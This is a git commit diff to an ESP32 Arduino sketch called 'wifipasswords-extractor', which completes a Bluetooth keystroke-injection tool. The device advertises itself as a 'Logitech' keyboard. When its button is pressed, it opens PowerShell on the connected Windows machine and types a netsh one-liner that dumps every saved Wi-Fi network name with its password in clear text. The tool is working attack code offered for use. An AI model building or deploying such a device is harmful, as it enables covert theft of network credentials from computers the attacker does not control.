656402f2460ae9977e23fb74c34feddcd3b52f82
Diwa Tomy <144988434+serval19@users.noreply.github.com>
2025-10-01 20:15:57 +0530

    Completed the code.
    Working as expected

--- wifipasswords-extractor/wifipasswords-extractor.ino
+++ wifipasswords-extractor/wifipasswords-extractor.ino
@@ -2,7 +2,7 @@
 #define pin 2
 bool laststate1=HIGH;
 const char* name="Logitech";
-BleKeyboard keyboard(name,"Espressif",,80);
+BleKeyboard keyboard(name,"Espressif",80);
 bool state1;
 void setup(){
   Serial.begin(115200);
@@ -14,12 +14,28 @@ void loop(){
     state1=digitalRead(pin);
     if(laststate1==HIGH && state1==LOW){
       Serial.println("Trigger running...");
-      keyboard.press(LEFT_KEY_GUI);
+      keyboard.press(KEY_LEFT_GUI);
       keyboard.press('r');
       delay(500);
       keyboard.releaseAll();
       delay(1000);
       keyboard.print("powershell");
+      delay(100);
+      keyboard.press(KEY_RETURN);
+      delay(500);
+      keyboard.releaseAll();
+      delay(1000);
+      const char* payload = "netsh wlan show profile | Select-String \"All User Profile\" | ForEach-Object { $ssid = $_.ToString().Split(':')[1].Trim(); $passwordLine = netsh wlan show profile name=$ssid key=clear | Select-String \"Key Content\"; if ($passwordLine) { $password = $passwordLine.ToString().Split(':')[1].Trim(); } else { $password = 'No password'; } [PSCustomObject]@{SSID=$ssid;Password=$password} }";
+      for(int i=0;i<strlen(payload);i++){
+        keyboard.print(payload[i]);
+        delay(50);
+      }
+      delay(100);
+      keyboard.press(KEY_RETURN);
+      delay(500);
+      keyboard.releaseAll();
+      laststate1=state1;
     }
+    delay(100);
   }
 }
